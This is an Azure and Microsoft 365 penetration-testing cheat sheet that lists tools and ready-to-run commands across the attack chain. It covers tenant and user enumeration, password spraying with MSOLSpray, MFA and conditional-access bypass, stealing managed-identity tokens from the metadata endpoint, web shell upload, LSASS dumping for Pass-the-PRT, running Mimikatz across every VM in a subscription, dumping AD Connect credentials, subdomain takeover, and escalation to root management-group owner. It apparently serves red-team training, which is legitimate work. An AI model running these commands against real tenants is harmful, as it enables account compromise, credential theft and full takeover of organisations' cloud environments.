# Azure Pentest : Tools and Techniques

MITRE Att&ck : Cloud Matrix  
https://attack.mitre.org/matrices/enterprise/cloud/

![](images/image-1024x556.png)

### Recon / Discovery
> host -a client.com

> nslookup x.x.x.x 

> nmap -Pn -p- -sV -vv -A -sS client.com

### Misc online tools
- Shodan (shodan.io)
- Censys (censys.io)
- Threat Crowd (https://www.threatcrowd.org)

### DNS Records
Leverage DNS records (N, MX, NS, SPF, TXT, CNAME, A) to determine cloud providers and services of a targeted domain/organization.

- https://github.com/darkoperator/dnsrecon
- https://github.com/lanmaster53/recon-ng
- https://github.com/aboul3la/Sublist3r

> python3 dnsrecon.py -d company.com -D subdomains-top1mil.txt -t brt  

### Azure Netblocks
##### Public
https://www.microsoft.com/en-us/download/details.aspx?id=56519

##### US Gov
https://www.microsoft.com/en-us/download/details.aspx?id=57063

##### Germany
https://www.microsoft.com/en-us/download/details.aspx?id=57064

##### China
https://www.microsoft.com/en-us/download/details.aspx?id=57062

##### Cloud IP Ranges (NCCGroup)
- https://github.com/nccgroup/cloud_ip_ranges

> python3 cloud_ip_ranges.py 52.4.0.0

### Determin identity federation servers
- ADFS
- AUTH
- Okta
- ping
- SSO
- STS
- Oauth
- OpenId
- SAML
- WS

### Getting Tenant Id for specific domain
- https://enterpriseregistration.windows.net/company.com/enrollmentserver/contract?api-version=1.4

### Leak credentials
Cloud credentials in code and text repositories:  
- federations service private certificates
- storage account keys/sas	
- Azure publish setting file certificates

##### Git / Repo secret parsers
Bitbucket, GitLab, Github, Gerrit, GitBlit, Azure Repo, Docker Hub, Git, SVN...

- gitleaks (https://github.com/zricethezav/gitleaks)
- trufflehog (https://github.com/trufflesecurity/truffleHog)
- git-secrets (https://github.com/awslabs/git-secrets)
- shhgit (https://github.com/eth0izzle/shhgit)
- gitrob (https://github.com/michenriksen/gitrob)

##### Git / Repos (post-compromise)
--> Find internal repos  
- Less protected and greater chance to find secrets or leaked access keys

1. Portscan internal web services (80,443,etc)
2. EyeWitness to screenshot each service
3. **Additional**: 
	- Query AD for all hostnames
	- Look for subdomains git, code, repos, bitbucket, gitlab

### Certificate Transparency

Identify cloud services, assets and nameserver records via certificate transparency logs and DNS records.  

--> https://crt.sh/   
--> https://censys.io/certificates   
--> https://ui.ctsearch.entrust.com/ui/ctsearchui  

### Specific Google Dorks
##### Azure SQL Databases
database.windows.net" site:pastebin.com

##### Web.config file 
site:github.com web.config "StorageConnectionString" "DefaultEndpointsProtocol"

### User enumeration
#### Microsoft 365 endpoint
- https://login.microsoftonline.com/company.com/v2.0/.well-known/openid-configuration
- https://login.microsoftonline.com/getuserrealm.srf?login=username@company.com&xml=1
	- This will give back the tenant ID

#### Azure endpoint
User enumeration on Azure can be performed at :  
- https://login.microsoft.com/common/oauth2/token
--> Endpoint will tell if a user exist or not  

Tool (PowerShell) : https://github.com/dafthack/MSOLSpray  

--> Check on Google and other  browser for tenant-id or subscription-id, it could lead to github repo for example containing other potential secrets.

#### OneDrive enumeration
Enumerate users via OneDrive endpoint.  
- https://github.com/nyxgeek/onedrive_user_enum  
- https://www.trustedsec.com/blog/achieving-passive-user-enumeration-with-onedrive/
OneDrive users have a file share URL with a known location:  
--> https://company-my.sharepoint.com/personal/john_doe_company_com/_layouts/15/onedrive.aspx  

> python3 onedrive_enum.py -U users.txt -d company.com

- **Note**: Users that are valid but who have not yet signed into OneDrive will return a 404 not found.

- **Note**: Does not attempt a login and is much more passive, and should be undetectable to the target org. Microsoft will see the hits, but the target org won't

#### AADInternals
- https://github.com/Gerenios/AADInternals
- https://o365blog.com/aadinternals/

AADInternals is PowerShell module for administering Azure AD and Office 365  

> PS C:\ > Install-Module AADInternals
##### Get tenant name, authentication, brand name (usually same as directory name) and domain name
> PS C:\ > Get-AADIntLoginInformation -UserName jdoe@company.com
##### Get Tenant Domains
> PS C:\ > Get-AADIntTenantDomains -Domain company.com
##### Get All information
> PS C:\ > Invoke-AADIntReconAsOutsider -DomainName company.com


#### MicroBurst (enumeration modules)
##### Enumerate used services

- https://github.com/NetSPI/MicroBurst  
--> Edit the permutations.txt to add permutations such as career, hr, users, file and backup  

> PS C:\ > Import-Module MicroBurst.psm1 -Verbose

> PS C:\ > Invoke-EnumerateAzureSubDomains -Base company -Verbose

##### Enumerate Azureblobs
--> Specific module for blobs enumeration : *Invoke-EnumerateAzureBlobs*  
- Brute forces storage account names, containers and files
- Uses permutations to discover storage accounts

> PS C:\ > Import-Module .\MicroBurst.psm1

> PS C:\ > Invoke-EnumerateAzureBlobs -Base company.com -OutputFile azureblobs.txt

#### Data in public blobs
- Containers =/= Blobs  

Container organizes a set o blobs. Similar to directory in a file system.  

- Predictable URLs at **core.windows.net**
	- storage-account-name.blob.core.windows.net
	- storage-account-name.file.core.windows.net
	- storage-account-name.table.core.windows.net
	- storage-account-name.queue.core.windows.net
	- storage-account-name.database.windows.net

Access Policy in Blob/Containers:  
- *Blob* : Anyone can anonymously read blobs, but can't list the blobs in the container.
- *Container* ; Allows for listing containers and blobs.  

Discovery using **dnscan.py**: 
> python dnscan.py -d blob.core.windows.net -w subdomains-100.txt  
--> This could be done using other predictable URLS at **core.windows.net**

#### Cloud_Enum
Cloud_enum tool permits to enumerate Azure Storage accounts, blob containers, hosted DBs, VM and WebAps.  

- https://github.com/initstring/cloud_enum 
> python3 cloud_enum.py --disable-aws --disable-gcp -k companyName

#### CloudBrute
Brute forcing tool to find Microsoft Storage or Apps  

- https://github.com/0xsha/CloudBrute

> ./CloudBrute -d company.com -k company -t 80 -T 10 -c microsoft -m storage -w ./data/storage_small.txt

#### Listing azure storage
In case container is set to *container* access policy and allows for listing.  

We can list blob within a known container using the following API endpoint:
- https://STORAGENAME.blob.core.windows.net/CONTAINERNAME?restype=container&comp=list

--> POTENTIAL PROJECT DEV PYTHON TO REQUEST AZURE API FOR BLOB, CONTAINER... ONCE we have a valid storage for exemple company.blob.core.windows.net  
- https://docs.microsoft.com/en-us/rest/api/storageservices/list-containers2

#### GreyHatWarfare
Finding Azure resources such as blob, files, tables storage: 
- https://buckets.grayhatwarfare.com/

#### Dorks
Website hosted on Azure:
- site:azurewebsites.net

Blob storage containing credentials
- site:*.blob.core.windows.net ext:xls | ext:xlsx (login | password | username)

https://github.com/securethelogs/ZorkAzure

#### Azure subdomain takeovers
1. Azure CloudApp: cloudapp.net
- Check if CNAME for company.com point to **cloudapp.net** 
	+ site:cloudapp.net
	+ dig company.com ANY +noall +answer
- Go to https://portal.azure.com/?quickstart=True#create/Microsoft.CloudService
- Register unclaimed domain which CNAME is pointing to  


2. Azure Websites : azurewebsites.net
- Check CNAME with dig pointing to azurewebsites.net
 	+ site:azurewebsites.net
	+ dig company.com ANY +noall +answer
- Go to https://portal.azure.com/#create/Microsoft.Website
- Register unclaimed domain which CNAME is pointing to
- Register domain on the Custom domains section of the dashboard

3. Azure VM : cloudapp.azure.com
- Check CNAME with dig pointing to *.region.cloudapp.azure.com
	+ site:cloudapp.azure.com
	+ dig company.com ANY +noall +answer
- Registering a new VM in the same region with size Standard_B1ls (cheapest) with 80 and 443 open
- Go to Configuration and set the domain name which CNAME is pointing

#### Validate email addresse
- https://github.com/LMGsec/o365creeper	
> python2.7 o365creeper.py -e johndoe@company.com  

--> No trace/logs in Azure AD logs.  

- https://github.com/lutzenfried/OffensiveCloud/blob/main/Azure/Tools/azurec.sh  
> ./azurec.sh company.com /tmp/emails.txt

#### Password spraying
- https://github.com/dafthack/MSOLSpray

Password spraying tool for Microsoft Online accounts (Azure/O365). The script logs if a user cred is valid, if MFA is enabled on the account, if a tenant doesn't exist, if a user doesn't exist, if the account is locked, or if the account is disabled. (Use updated version Nov 2021)  

> PS C:\ > Import-Module MSOLSpray.ps1  
> PS C:\ > Invoke-MSOLSpray -UserList .\userlist.txt -Password Winter2020

### Bypassing conditional access
- Change user agent to Android/Iphone user agent.
- Change location, to specific client location.
- Legacy Auth (EAS, EWS, Outlook for Mac)  

--> The [Roadrecon](https://github.com/dirkjanm/ROADtools) tool (*dirkjanm*) is capable of gathering and parsing Condtional Access Policies (Azure AD account required.)  
> PS C:\ > roadrecon plugin policies  

### Bypassing MFA
- Use directly powershell AZ module
> $credential = Get-Credential  
> Connect-AzAccount -Credential $credential
 
- PRT Attack  

**Type 1**: Pass the cookie. By stealing a newly attacker generated PRT cookie from the victim’s computer and use this PRT cookie to fetch access token from Azure AD  
 
**Type 2**: Pass the PRT. By stealing the PRT and session/derived key from LSASS on victim’s computer and generate a PRT cookie on attacker computer. Use this cookie to fetch an access token from Azure AD.  

- Connect from internal network IP range  
The **Trusted IPs** feature of Azure AD Multi-Factor Authentication bypasses multi-factor authentication prompts for users who sign in from a defined IP address range.

- Legacy Auth (EAS, EWS, Outlook for Mac)  
--> (MFASweep tool)  
--> https://github.com/dafthack/MFASweep  

- https://www.blackhillsinfosec.com/exploiting-mfa-inconsistencies-on-microsoft-services/ 
 
- https://www.slashadmin.co.uk/bypass-mfa-for-azure-runbooks/

<br/>

## Initial access Attacks

### Instance metadata service
- A metadata endpoint was created and hoster on a non-routable IP address at **169.254.169.254**.

- Can contain access/secret keys
- Only reachable from localhost

--> Exploitation through Server compromise or SSRF vulnerabilities  
- http://169.254.169.254/metadata
- GET 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' HTTP/1.1 Metadata: true

> curl -H Metadata:true --noproxy "*" "http://169.254.169.254/metadata/instance?api-version=2020-09-01"  

![imds](https://miro.medium.com/max/382/1*pW9dE1sdHUr4-wvHVyo9dw.png)

##### Targeting Azure Resource Manager
> curl -H Metadata:true --noproxy "*" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"  

##### Targeting Azure Key Vault
> curl -H Metadata:true --noproxy "*" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net"  

--> Then Token can be used directly with **Azure REST API**  

#### Enterprise Apps
#### App Services
#### Logical Apps
#### Function Apps
#### Unsecured storage

#### Command injection (web app)
Multple vulnerabilities scenarios possibles:  
- An uploaded web shell
- Unintended CMD injection via an application issue
- Intended CMD Injection through application functionality

1. Upload webshell to insecure webapp
2. If command execution is possible, execute **env** command
	- Check for : *IDENTITY_HEADER* and *IDENTITY_ENDPOINT* environment variables
3. Get access token from managed identity using another webshell

- https://www.netspi.com/blog/technical/cloud-penetration-testing/lateral-movement-azure-app-services/

#### Server Side Template Injection - SSTI

#### Phishing
#### Consent Grant Attacks (365-Stealer)
In an illicit consent grant attack, the attacker creates an Azure-registered application that requests access to data such as contact information, email, or documents. The attacker then tricks an end user into granting consent to the application so that the attacker can gain access to the data that the target user has access to.  

![illicit_consent_attack](https://static.wixstatic.com/media/2082fb_07cda455396d4c46a58f3ce3077ba13b~mv2.png/v1/fill/w_740,h_531,al_c,q_95/2082fb_07cda455396d4c46a58f3ce3077ba13b~mv2.webp)

--> **Tool** : https://github.com/AlteredSecurity/365-Stealer.git  

- https://www.alteredsecurity.com/post/introduction-to-365-stealer
- https://www.youtube.com/watch?v=51FSvndgddk&list=WL
- https://positivethinking.tech/insights/what-is-an-illicit-consent-grant-attack-in-office-365/
- https://www.proofpoint.com/us/blog/threat-insight/ta2552-uses-oauth-access-token-phishing-exploit-read-only-risks
- https://www.mdsec.co.uk/2019/07/introducing-the-office-365-attack-toolkit/
- https://www.cloud-architekt.net/detection-and-mitigation-consent-grant-attacks-azuread/

#### Device Code Phish


<br/>

## Authenticated enumeration

- https://github.com/0xJs/CARTP-cheatsheet/blob/main/Authenticated-enumeration.md

Once an account is compromised we can try to perform some reconnaissance.

- Access portal.azure.com and go to Azure Active Directory to get list of all group/users
	- O365 Global Address List has this info also
- If access is locked, try PowerShell cmdlets, likely to work
	+ Compagny wide setting locking down the entire org from viewing Azure info via cmd line:
	> Set-MsolCompanySettings -UsersPermissiontoReadOtherUsersEnabled $false  
	
### Storage explorer (Gui tool)
Once credentials are recovered we can try to use them to explore Azure storage account using Storage Explorer tool.  

- https://azure.microsoft.com/en-us/features/storage-explorer/
	
### Azure CLI/PowerShell modules
It is also possible to use multiple cli modules for authenticated and unauthenticated enumeration.  

- https://github.com/lutzenfried/OffensiveCloud/blob/main/Azure/Azure%20Command%20Line%20CheatSheet.md

### o365 enumeration
Enumeration tool using valid credentials for O365 and AzureAD  

- https://github.com/nyxgeek/o365recon

--> Require PowerShell modules **MSOnline** and **AzureAD**.  

> PS C:\ > .\365recon.ps1 -azure  

### Enumerate O365 Groups
Enumerate Microsoft 365 Groups in a tenant with their metadata.  

> python3 all_groups.py -u chrisb@company.com -p pass123

### Get-MsolRolesAndMembers
Retrieve the list of current roles and associated role members in an Office 365 Tenant.  

- https://gist.github.com/ciphertxt/2036e614edf4bf920796059017fbbc3d  

```
Import-Module MSOline -EA 0

Connect-MsolService -Credential (Get-Credential)

$admins=@()

$roles = Get-MsolRole 

foreach ($role in $roles) {
    $roleUsers = Get-MsolRoleMember -RoleObjectId $role.ObjectId

    foreach ($roleUser in $roleUsers) {
        $roleOutput = New-Object -TypeName PSObject
        $roleOutput | Add-Member -MemberType NoteProperty -Name RoleMemberType -Value $roleUser.RoleMemberType
        $roleOutput | Add-Member -MemberType NoteProperty -Name EmailAddress -Value $roleUser.EmailAddress
        $roleOutput | Add-Member -MemberType NoteProperty -Name DisplayName -Value $roleUser.DisplayName
        $roleOutput | Add-Member -MemberType NoteProperty -Name isLicensed -Value $roleUser.isLicensed
        $roleOutput | Add-Member -MemberType NoteProperty -Name RoleName -Value $role.Name

        $admins += $roleOutput
    }
} 

$admins | Export-Csv -NoTypeInformation .\365RolesUsers.csv
```

### Listing users with MFA enable
--> Azure AD administrator role required  

```
Get-MsolUser -all | select DisplayName,UserPrincipalName,@{N="MFA Status"; E={ if( $_.StrongAuthenticationMethods.IsDefault -eq $true) {($_.StrongAuthenticationMethods | Where IsDefault -eq $True).MethodType} else { "Disabled"}}} | export-csv .\mfaresults.csv
```

### Azure Function
Enumerates any **Azure Function** looking for plaintext values added as environment variables or connection strings within source code.

### Azurite
Tool developed to assist during enumeration and reconnaissance activities.  

- 2 scripts :  
	- Azurite Explorer
	- Azurite Visualizer  
	
--> https://github.com/mwrlabs/Azurite

### AzureHound (Bloodhound)
> Connect-AzAccount  
> Import-Module ./AzureHound.ps1  
> Invoke-AzureHound  

--> Import and upload ZIP file result within **BloodHound**  

### ROADTool
ROADrecon is a tool for exploring information in Azure AD from both a Red Team and Blue Team perspective. (Python)  

> roadrecon auth -u test@tenantNAME.onmicrosoft.com -p pass123  
> roadrecon gather  
> roadrecon gui  

- https://github.com/dirkjanm/ROADtools
- https://github.com/dirkjanm/ROADtools/wiki/Getting-started-with-ROADrecon (WIKI)

--> Roadtools can also be used for lateral movement with differents tokens and cookies:  
- PRT cookie
- Direct access/refresh token

### Scoutsuite
- https://github.com/nccgroup/ScoutSuite
- https://github.com/nccgroup/ScoutSuite/wiki/Azure

Open source multi-cloud security-auditing tool, which enables security posture assessment of cloud environments.  

> az login  
> python3 scout.py azure -c

### MicroBurst 
- https://github.com/NetSPI/MicroBurst
- https://github.com/NetSPI/MicroBurst/wiki

#Authencticated enumeration
> Get-AzureDomainInfo -folder MicroBurst -VerboseGet-MSOLDomainInfo  
> Get-MSOLDomainInfo  

### Stormspotter
- https://github.com/Azure/Stormspotter

### CS-Suite
- https://github.com/SecurityFTW/cs-suite

--> Authenticate the azure cli az login

> python cs.py -env azure

### CIS scanner
- https://github.com/kbroughton/azure_cis_scanner

--> Authenticate the azure cli az login  

> pip3 install azure-cis-scanner  
> azscan

#### Storage accounts
#### Key vaults
#### Blobs
#### Automation accounts
#### Deployment templates

<br/>

## Exploitation

<br/>

## Lateral movement

#### Scavenging Runbooks for creds
- Runbooks : Permit to automate various tasks in your Azure cloud environment. 
--> Runbooks require an Automation account  
--> Runbooks can contain sensitive information  

> PS C:\ > Get-AzAutomationAccount  
> PS C:\ > Get-AzAutomationRunbook -AutomationAccountName  -ResourceGroupName  
> PS C:\ > Export-AzAutomationRunbook -AutomationAccountName  -ResourceGroupName  -Name  -OutputFolder .\  

#### Azure password reset
![password_reset_tab](https://pentestbook.six2dez.com/~/files/v0/b/gitbook-28427.appspot.com/o/assets%2F-M5x1LJiRQvXWpt04_ee%2F-MMEpSMCIzROirYZ8Bg8%2F-MMErdOr1gyFJl_WHIB-%2Fimage.png?alt=media&token=750eded8-0992-4716-aa59-9908db1ee05f)

#### Steal Access Tokens
Typical configuration files for .Net/Azure:  

##### Azure Cloud Service Packages (.cspkg)
- Deployment files created by Visual Studio.  
--> Look through CSPKF zip files for creds/certs  
--> Search Visual Studio Publish directory   

The default publish folder format is : 
- ```bin\Debug\{TARGET FRAMEWORK MONIKER}\publish\```
- ```bin\Debug\netcoreapp2.2\publish\```

##### Azure publish settings files (.publishsettings)
- Designed to help developers push code to Azure
- Can contain a base64 encoded Management Certificate
- Sometimes cleartext credentials  

--> Open publishsettings file in text editor  
--> Save *ManagementCertificate* section into new **.pfx** file  
--> No password for the **.pfx** file  

**Locations**: User's downloads, VS projects directories.  

##### Web Config / App Config
- Include cleartext credentials
- WebApps often new read/write access to cloud storage or DBs
- Web.config & app.config might contain creds or access tokens  
--> Look for management cert and extract to pfx  
--> Often found in root folder of webapp  

##### PowerShell authenticated session
During authenticated session with the Az Powershell module a **TokenCache.dat** file gets generated.  

--> Check for **%USERPROFILE&\\.azure\\** for auth tokens  
--> Check disk for other saved context files (.JSON)  

#### Azure AD User Attributes
- Credentials within description or comment field

One-liner to search all Azure AD user attributes for passwords :   

> $users = Get-MsolUser -All; foreach($user in $users){$props = @();$user | Get-Member | foreach-object{$props+=$_.Name}; foreach($prop in $props){if($user.$prop -like "*password*"){Write-Output ("[*]" + $user.UserPrincipalName + "[" + $prop + "]" + " : " + $user.$prop)}}} 

#### Custom Script Extension
The Custom Script Extension is particularly interesting as it downloads a script from a user-specified location (e.g. URL, blob storage, etc.) and then executes the script on a running Azure Windows or Linux VM.  


**Privilege required** : *Virtual Machine Contributor*

- https://www.netspi.com/blog/technical/cloud-penetration-testing/attacking-azure-with-custom-script-extensions/

#### Hunting admins
> PS C:\ > Get-MsolRoleMember -RoleObjectId 35j7643-444dl-242pq3-02143435 | fl  
--> Return Global administrator = Company administrator  
--> If attribute **LastDirSyncTime** is empty = Account only exist in AzureAD not exist on AD on-prem.

#### Run Command feature
The Run Command feature connects to the Virtual Machine Agent to run commands and scripts.  

The scripts can be provided through :  
- Azure Portal
- REST API
- Azure CLI
- PowerShell. 
> PS C:\> Invoke-AzureRmVMRunCommand 	

--> Using **Run Command** commands can be executed even when the VM is otherwise unreachable (e.g. if the RDP or SSH ports are closed).  
--> **Run Command** execute commands in elevated privileges.  

**Privilege required** : *Microsoft.Compute/virtualMachines/runCommand/action*  
--> Virtual machine contributor  

It is also possible to use MicroBurst with **Invoke-AzureRmVMBulkCMD** module to run command on all the virtual machine in whole subscription:  
> PS C:\ > Import-module MicroBurst.psm1  
> PS C:\ > Invoke-AzureRmVMBulkCMD -Script Mimikatz.ps1 -Verbose -output Output.txt


#### Cloud Application Administrator Role
- Users in this role can create and manage all aspects of applications
- Application Administrators can manage application credentials that allows them to impersonate the application.

List all Azure applications:  
> az ad app list --all

- Tool appJack.py

- https://dirkjanm.io/azure-ad-privilege-escalation-application-admin/

#### Pass-the-PRT
- https://docs.microsoft.com/en-us/azure/active-directory/devices/concept-primary-refresh-token  s
**Primary Refresh Token** (PRT) is a special high privileged refresh token where you can request **access tokens** for any registered application in Azure and Microsoft 365 to authenticate against it. Compared to Active Directory in on-premises networks, it is the equivalence to the Ticket Granting Ticket (TGT).

- JSON Web Token (JWT)
- Storage
	- Cached by Cloud AP in LSASS
	- Session key protected by TPM (if present)
- Validity
	- Valid for 14 days
	- Renewed every 4 hours
- Invalidation
	- Invalid user (deleted/disabled)
	- Invalid device
	- Password change

![prtcookie](https://docs.microsoft.com/en-us/azure/active-directory/devices/media/concept-primary-refresh-token/prt-initial-sign-in.png)

##### Attack
1. Pass-The-PRT
	- Steal the PRT from LSASS on victim's computer
	- Generate a PRT cookie on attacker's computer
	- Use the cookie to fetch an access token from Azure AD

2. Pass-The-Cookie
	- Steal a newly generated PRT cookie from victim's computer
	- Use the cookie to fetch an access token from Azure AD

1. Verify victim machine is AD Azure joined and verify if the session key is protected by TPM chip, dump LSASS process: 
> dsregcmd.exe /status  
> LSASS dump (sekurlsa::minidump lsass.dmp -> sekurlsa::cloudap)
2. Generate nonce using ROADTools
>  roadrecon auth --prt-init
3. Generate an Azure AD PRT cookie using ROADToken
> .\ROADToken.exe 
4. Paste the PRT cookie to generate a graph API access token
> roadrecon auth --prt-cookie **COOKIE_FROM_ROAD_TOKEN**  
> cat .roadtools_auth | python3 -m json.tool
5. Use the token to connect on AzureAD (AccountId = OID of user)
> Connect-AzureAD -TenantId 134jjkhjk-4324h4-1231jff-3453jkjij -AccountId 123 -AadAccessToken string123


--> It is also possible to directly insert the x-ms-RefreshTokenCredential within browser cookie. (https://login.microsoftonline.com with HTTPOnly)  
--> TPM can be bypass  
- https://www.youtube.com/watch?v=9WDe7IiSrWE
- https://derkvanderwoude.medium.com/pass-the-prt-attack-and-detection-by-microsoft-defender-for-afd7dbe83c94
- https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/
- https://dirkjanm.io/digging-further-into-the-primary-refresh-token/

#### Pass-the-Certificate
- https://medium.com/@mor2464/azure-ad-pass-the-certificate-d0c5de624597


#### Across Tenant
#### Cloud to on prem


#### On prem to cloud

- If an organization uses **Password Hash Synchronization**, Azure AD connect has the privileges to perform a **DCSync**, which allows it to sync all attributes (including password hashes) from domain controllers.

**ADConnect inner workings**  
![](images/adconnect_components.png)

**ADConnect storage mechanism**  
![](images/adconnect_storage.png)

- https://dirkjanm.io/updating-adconnectdump-a-journey-into-dpapi/  

- https://github.com/fox-it/adconnectdump

AdConnectDump toolkit offers several ways to extract and decrypt stored Azure AD and Active Directory credentials from Azure AD Connect servers. These credentials have high privileges in both the on-premise directory and the cloud.    

**3 methods of dumping AD Connect Credentials : **

| Tool   | Requires code exec on target   |  DLL dependencies  | Requires MSSQL loccaly  | Requires python locally   |
|    :---:    |    :---:    |    :---:    |    :---:    |    :---:    |
| ADSyncDecrypt      | Yes      | Yes      | No      | No      |
| ADSyncGather   | Yes      | No      | No      | Yes      |
| ADSyncQuery      | No      | No      | Yes      | Yes      |

**Main objectives :**  
- Compromise the AD & Azure credentials configured within the AD Connect Service
- Leverage the local creds to perform DC sync attack
- Leverage Azure creds to access Tenant

1. Finding the server where Azure AD Connect is installed.  
--> Microsoft made the task easy for us, by including the synchronization server name and the corresponding Azure AD tenant to the LDAP description of the MSOL user.  
> $ ldapsearch -H ldap://DC01.COMPANY.COM:389 -D "COMPANY\user" -w "****" -b "DC=COMPANY,DC=COM" '(description=*Azure*)' description

2. We will need **Local Admin** account or **ADsync** service account to interact with the Azure AD Connect DB.  
--> This DB stores an encrypted version of the MSOL account password which be decrypted with *C:\Program Files\Microsoft Azure AD Sync\Binn\mcrypt.dll* and **NT SERVICE\ADSync** DPAPI key. (https://dirkjanm.io/updating-adconnectdump-a-journey-into-dpapi/)  



## Privilege escalation
#### RBAC roles
#### Asure AD roles

#### Elevate access Global Admin 
- https://docs.microsoft.com/en-us/azure/role-based-access-control/elevate-access-global-admin

![elevatega](https://adsecurity.org/wp-content/uploads/2020/05/image-36.png)

--> When you set the toggle to **Yes**, you are assigned the **User Access Administrator** role in Azure RBAC at **root scope** (/).  
--> As attacker you can set **Owner** role over the root management group to get full access over all the Azure subscriptions, management groups, resource groups and resources under the root management group.  

-->Azure AD and Azure resources are secured independently from one another. That is Azure AD role assignments do not grant access to Azure resources automatically.  

--> For many organisation the group that manages Azure AD and Office365 are different group from those that manage Azure.  

![roleelevate](https://adsecurity.org/wp-content/uploads/2020/05/image-31.png)

- If this option is toggled to “Yes” that the account is removed from the Global Administrator role, the Azure RBAC role remains and is not removed.
- It could permit persistence over the root management group without global admin role on the Tenant.

--> User Access Administrator provides the ability to modify any group membership in Azure.  

--> The attacker can now set any Azure AD account to have privileged rights to Azure subscriptions and/or Azure VMs.  

- https://www.youtube.com/watch?v=AR5aLszXA2E 

#### Accross subscriptions
#### Service Principal Hijacking
Anytime you create a Microsoft 365 by default, that account will spin up 200 default service principals within the O365 tenant.

--> None of them are listed in the Azure GUI portal under the user section, you have to go in *Search Principals* to see them.  

**Ex**: You compromise an account for somebody which have an "Application Administrator" role. This role allow users to change passwords or certificates for service principals, even the default ones.  

--> Identify an account which have an higher level of privilege than your "Application Administrator"  

#### Azure Key Vaults
- Vaults for storing passwords and other secrets
- Other cloud apps and services can use these
- Easily store and manage SSL/TLS certs  
--> By default only the **owner** of the key vault can access the key  
--> **Contributors** over key vault resources have the ability to modify certain permissions on keyvault. **Contributors** can modify their own permission to give them the read permission to read data within key vault.  

#### Microsoft 365 Compliance Search
- https://docs.microsoft.com/en-us/microsoft-365/compliance/content-search?view=o365-worldwide

- https://protection.office.com OR https://compliance.microsoft.com
- Must be a member of *eDiscovery Manager* role group in **Security & Compliance Center**.
	+ *Administrator*
	+ *compliance officer*
	+ *eDiscovery manager*

--> Search en report across all Microsoft 365 services to "passwords", "secrets"...

<br/>

## Persistence
#### Hooking Azure AD Connect
- https://blog.xpnsec.com/azuread-connect-for-redteam/
- https://www.youtube.com/watch?v=UxKEQ9tIiLs

#### Azure service principal backdoor


#### Virtual Machine Contributor
Virtual Machine Contributor lets you manage virtual machines but not access to them.  

This role seems limited but it has the permission to use **Run Command** feature. Allowing user with *Virtual Machine Contributor* role to execute system command over a VM with elevated privileges  

--> This right is **Microsoft.Compute/virtualMachines/runCommand/** action which is included in Virtual Machine Contributor  
--> Includes the ability to re-enable the Administrator account  
--> Target VM Domain Controler in Azure  

<br/>

# Training
### HackTheBox - BlackSky
- https://www.hackthebox.com/business/professional-labs/cloud-labs-blacksky

### Pentester Academy - CARTP
- https://bootcamps.pentesteracademy.com/course/ad-azure-nov-21

<br/>

# Azure Pentest : Resources
#### Conditional access
- https://danielchronlund.com/2018/11/21/azure-ad-conditional-access-policy-design-baseline/
- https://docs.microsoft.com/en-us/azure/active-directory/conditional-access/overview

#### Privilege escalation via Service Principal abuse
- https://posts.specterops.io/azure-privilege-escalation-via-service-principal-abuse-210ae2be2a5

#### AAD Internals
- https://o365blog.com/aadinternals/

#### AzureHound cheatsheet
- https://hausec.com/2020/11/23/azurehound-cypher-cheatsheet/

#### Attack AzureAD / Powerzure
- https://hausec.com/2020/01/31/attacking-azure-azure-ad-and-introducing-powerzure/

#### Getting Started In Pentesting the Cloud : Azure
- https://www.youtube.com/watch?v=u_3cV0pzptY

#### Awesome Azure Penetration Testing
- https://github.com/Kyuu-Ji/Awesome-Azure-Pentest

#### Exploiting IMDS
- https://medium.com/marcus-tee-anytime/steal-secrets-with-azure-instance-metadata-service-dont-oversight-role-based-access-control-a1dfc47cffac

#### Blue Cloud Of Death : Red Teaming Azure
- https://speakerdeck.com/tweekfawkes/blue-cloud-of-death-red-teaming-azure-1

#### From Azure AD to Active Directory (Sean Metcalf)
- https://adsecurity.org/?p=4277
- https://adsecurity.org/wp-content/uploads/2017/07/2017-DEFCON-HackingTheCloud-SteereMetcalf-Final.pdf

#### I'm in your cloud (Dirk-jan Mollema)
- https://www.youtube.com/watch?v=fpUZJxFK72k

#### Azure Role-Based Access Control Deep Dive
- https://www.youtube.com/watch?v=qFoHDTxkQII

#### Azure AD introduction for Red Teamers
- https://www.synacktiv.com/en/publications/azure-ad-introduction-for-red-teamers.html

#### Azure Fundamental for Ethical Hackers and Special Ops Team
- https://ninocrudele.com/wp-content/docs/Azure-Fundamental-for-Ethical-Hackers-and-Special-Ops-Team.pdf

#### Azure AD cheatsheet for the CARTP course
- https://github.com/0xJs/CARTP-cheatsheet

#### Azure/O365 Enumeration - Password Attacks List
- https://www.redsiege.com/wp-content/uploads/2021/06/O365UserEnumeration_PasswordAttacks.pdf


